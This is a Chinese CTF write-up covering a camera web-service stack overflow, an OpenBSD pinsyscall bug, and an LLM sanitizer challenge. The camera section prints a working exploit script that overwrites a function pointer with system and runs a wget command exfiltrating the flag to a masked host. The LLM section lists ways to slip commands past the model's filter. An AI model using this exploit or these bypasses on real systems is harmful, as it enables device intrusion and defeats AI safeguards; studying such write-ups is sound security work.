# Pwn



## RIPTC



## Let's party in the house

雖然可以用 QEMU 執行起來，但因為會輸出許多 log message，因此一般情況下很難 debug。不過修改 init script 結尾的部分成下方 script 片段即可解決：

```bash
/bin/busybox sh </dev/console >/dev/console &
exec /sbin/init "$@" < /dev/console >/dev/null 2>&1
```

- sh 在 background 還是會吃 TTY，所以還是可以讀輸入

但這會發生一個現象，因為 `/sbin/init` 最後也會執行 `sh`，這導致兩個 `sh` 同時在搶 tty。

我們新增下方程式碼到 `/etc/init.d/S50_IPcamApp` 最後一行，讓 `/sbin/init` 在啟動 `webd` (http service 的 binary) 後不繼續跑，這樣就可以避免上述的情況。

```bash
/bin/busybox sleep 10000000
```

---

漏洞部分細節有出現在 [T5 的文章](https://teamt5.org/en/posts/teamt5-pwn2own-contest-experience-sharing-and-vulnerability-demonstration/)，稍微逆向一下後會發現 `json_loads()` 能夠觸發。

我們只能存取到 BC500 的 http service，該服務是由 `webd` 負責處理，在接收到請求後會先進行初步處理，最後交由 CGI 執行。有些 CGI 是 post-auth 才能戳到，同時考慮到預設環境是無法使用 post-auth 的 CGI，因此我們只需要挑選不用 auth 的 CGI 來分析即可。

我們選擇不去逆向來找出可以執行到 pre-auth CGI 的方式。首先我們用 `gdbserver` attach 上 `webd`，並下斷點在 call CGI 的 function，之後開始亂戳 URL path。

我們先戳 `webd` 的字串中有的 URL path，發現 `syno-api/security/info/language` 能走到 `synocam_param.cgi`，並且在逆向分析後發現如果 HTTP request 的 Content-Type 為 application/json，或是 POST payload 格式為 `{"json": {}}` 時，就會在底層執行到 `json_loads()`。

`json_loads()` 使用 `scanf()` 去讀 json object 的 key 與 value [1]，但使用的 stack buffer size 分別是固定的 32 以及 12，因此當 key 長度超過 32，或是 value size 超過 12 時，就會發生 stack overflow。而 overflow 後 function 並不會馬上離開，而是會接下去執行 `filter_char()` [2]：

```c
void *__fastcall sub_6AD4(_DWORD *a1, char a2, int a3)
{
  [...]
  char key[32]; // [sp+14h] [bp-40h] BYREF
  char value[12]; // [sp+34h] [bp-20h] BYREF
  [...]
  while ( 1 )
  {
    [...]
    
    _isoc99_sscanf(s, "%s %s", key, value); // [1]
    
    [...]
    
    filter_char(a1, a3); // [2]
	
    [...]
  }
  return 0;
}
```

`filter_char()` 會對 json 特殊字元或是 object 內容做處理，會呼叫到 `sub_581C()` [3]：

```c
int __fastcall filter_char(int a1, int a2)
{
  char *s1; // [sp+8h] [bp-Ch]
  int v6; // [sp+Ch] [bp-8h]
  int v7; // [sp+Ch] [bp-8h]

  [...]
  do
  {
    do
      v6 = sub_581C(a1, a2); // [3]
    while ( v6 == ' ' );
  }
  [...]
}
```

當 key 的大小超過 0xa4 時，會 overflow 到 `*a` 的內容，因此我們可以在 `sub_5418()` 使用 function pointer 時 [4] 攔截程式的執行流程。同時 `*(a1 + 4)` 會因為 string 最後 NULL byte 的關係造成 partial overwrite， 並剛好指向 stack 上可控的字串內容：

```c
int __fastcall sub_5418(int a1, int a2)
{
  [...]
  if ( *(a1 + 20) )
    return *(a1 + 20);
  if ( !*(a1 + *(a1 + 16) + 8) )
  {
    v8 = (*a1)(*(a1 + 4)); // [4]
  }
}
```

exploit 時有兩個需要注意的地方：

1. Json string 只能是 ascii，否則進不到 CGI
2. CGI 每次都會跑起來，並且沒有方式拿到回顯，因此 libc base address 需要撞

因此我們把 `*a` 蓋成 address 由 ascii 組成的 `system`，命令字串把 flag 複製成 index.html：

```python
# !/usr/bin/python3

from pwn import *
import requests

q = "47.88.48.133:32959"
system = 0x767e3070
payload = b'a'*28 + b'a;wget${IFS}http://XXXXXXX:8000/$(cat${IFS}/flag);cat${IFS}/flag>/www/index.html;'.ljust(0x88, b'a') + p32(system)
count = 0

while True:
    count += 1
    if count % 10 == 0:
        print(f"{count}/4096")
    try:
        data = b'json={"' + payload + b'"}'
        r = requests.post(f"http://{q}/syno-api/security/info/language", data=data, timeout=1)
        print(r.text)
    except KeyboardInterrupt:
        exit(1)
    except:
        pass
```

P.S. 一開始這個版本的 exploit 測了非常多次都沒有成功，之後經歷了許多次修修改改，最後在拿回來跑的時候就成功了



作者有提供 pre-built gdb/gdbserver 的下載連結

- https://bin.leommxj.com/



## 烫烫烫

OpenBSD – pinning all system calls ([討論串](https://marc.info/?t=170205374600002&r=1&w=2))

> More recently, I made another change, so that the execve(2) system call could
> only be called from a singular, precise point in a static binary or in libc.so.

引入能讓 syscall 在特定 binary 或是 libc 位址才能執行的機制

>msyscall — permit syscalls from a region of pages

過去實作的 `msyscall()` 讓 syscall 能夠在特定範圍內執行

> Like with msyscall(2) before, ld.so(1) does the same job of parsing the
> "openbsd.syscalls" in libc.so, and uses a new pinsyscall(2) system call to
> tell the kernel where the system calls are allowed to enter form.

現在 `pinsyscall()` 讓特定 system call 只會在一些位址被執行 ([man](https://web.archive.org/web/20230901223831/https://man.openbsd.org/pinsyscall.2))。

下方為 man page 的說明：

> NAME
> pinsyscall — specify the call stub for a specific system call
>
> SYNOPSIS
> #include <sys/types.h>
> #include <sys/syscall.h>
>
> int
> pinsyscall(int syscall, void *start, size_t len);
>
> DESCRIPTION
> The pinsyscall() system call specifies the start to start + len range in the address space where the call stub for the specified syscall resides. This range is typically under 80 bytes long, and varies by architecture.

`elf_read_pintable()` 會在 kernel load ELF 的過程中被呼叫，會從解析好的 Elf_Phdr 中取出相關資訊來更新 pin table。然而在初始版本中，`elf_read_pintable()` 沒有檢查 ELF 中的 `syscalls[]` object 是否合法：

```c
for (i = 0; i < nsyscalls; i++)
	npins = MAX(npins, syscalls[i].sysno);
npins = MAX(npins, SYS_kbind);		/* XXX see ld.so/loader.c */
npins++;
```

在後續的版本 ([patch](https://marc.info/?l=openbsd-tech&m=170234892604404&w=2)) 有新增額外的檢查，包含 `pinsyscalls.sysno` 以及 `pinsyscalls.offset`：

```c
for (i = 0; i < nsyscalls; i++) {
    if (syscalls[i].sysno <= 0 ||
        syscalls[i].sysno >= SYS_MAXSYSCALL ||
        syscalls[i].offset > len)
        goto bad;
    npins = MAX(npins, syscalls[i].sysno);
}
```



## Router4

未公開



## T-Box





# Misc

## LLM Sanitizer

System prompt 會要求 LLM 將使用者的輸入轉為 python script 並執行，但是會先過濾掉一些會執行到命令的 function

- 使用的 large language model (LLM) 即是 gpt-3.5-turbo-1106



繞掉的做法至少兩種：

1. 將 command 以倒序的方式傳入 + 執行 (`exec(cmd[::-1])`)
2. 用 pickle 的方式執行
